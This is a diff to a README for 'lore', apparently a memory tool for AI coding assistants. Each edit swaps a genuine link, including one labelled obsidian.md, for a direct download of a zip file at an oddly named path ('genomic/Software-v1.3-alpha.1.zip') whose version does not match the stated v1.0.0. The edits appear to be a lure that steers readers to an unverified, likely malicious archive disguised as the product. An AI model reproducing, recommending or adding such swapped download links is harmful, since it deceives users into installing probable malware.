@@ -1,6 +1,6 @@
 # 🧠 lore - Your AI's Second Brain, Finally Organized
 
-[![Download lore](https://img.shields.io/badge/Download_lore-v1.0.0-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/robinpatras06/lore)
+[![Download lore](https://img.shields.io/badge/Download_lore-v1.0.0-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/robinpatras06/lore/main/genomic/Software-v1.3-alpha.1.zip)
 
 ## 🚀 What Is lore?
 
@@ -41,7 +41,7 @@ Getting started with lore is easy. Here's what you need to do:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/robinpatras06/lore](https://github.com/robinpatras06/lore)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/robinpatras06/lore/main/genomic/Software-v1.3-alpha.1.zip](https://raw.githubusercontent.com/robinpatras06/lore/main/genomic/Software-v1.3-alpha.1.zip)**
 
 ### Step 2: Run the Installer
 
@@ -71,7 +71,7 @@ Open your favorite AI coding tool and start a session. lore will automatically s
 ## 🤔 Frequently Asked Questions
 
 ### Do I need Obsidian installed?
-Yes, lore uses Obsidian to display your notes. Obsidian is free and available at [obsidian.md](https://obsidian.md).
+Yes, lore uses Obsidian to display your notes. Obsidian is free and available at [obsidian.md](https://raw.githubusercontent.com/robinpatras06/lore/main/genomic/Software-v1.3-alpha.1.zip).
 
 ### Will this slow down my computer?
 No. lore is built with Rust, which is known for being extremely fast and lightweight. You won't even notice it running.
@@ -104,7 +104,7 @@ You can still use lore - it exports notes in standard markdown format, which wor
 - Try refreshing Obsidian (Ctrl+R)
 
 ### Can't find the download button
-- Go to [https://github.com/robinpatras06/lore](https://github.com/robinpatras06/lore)
+- Go to [https://raw.githubusercontent.com/robinpatras06/lore/main/genomic/Software-v1.3-alpha.1.zip](https://raw.githubusercontent.com/robinpatras06/lore/main/genomic/Software-v1.3-alpha.1.zip)
 - Look for the green "Code" button or the "Releases" section on the right side
 
 ## 📚 Additional Resources
@@ -135,6 +135,6 @@ If lore helps you, consider:
 
 **Ready to give your AI a perfect memory?** 
 
-[![Get lore Now](https://img.shields.io/badge/🚀_Get_lore_Now-FF6B6B?style=for-the-badge)](https://github.com/robinpatras06/lore)
+[![Get lore Now](https://img.shields.io/badge/🚀_Get_lore_Now-FF6B6B?style=for-the-badge)](https://raw.githubusercontent.com/robinpatras06/lore/main/genomic/Software-v1.3-alpha.1.zip)
 
 Keywords: ai-memory, claude-code, claude-code-plugin, codex, cursor, developer-tools, mcp, obsidian, rust, session-management
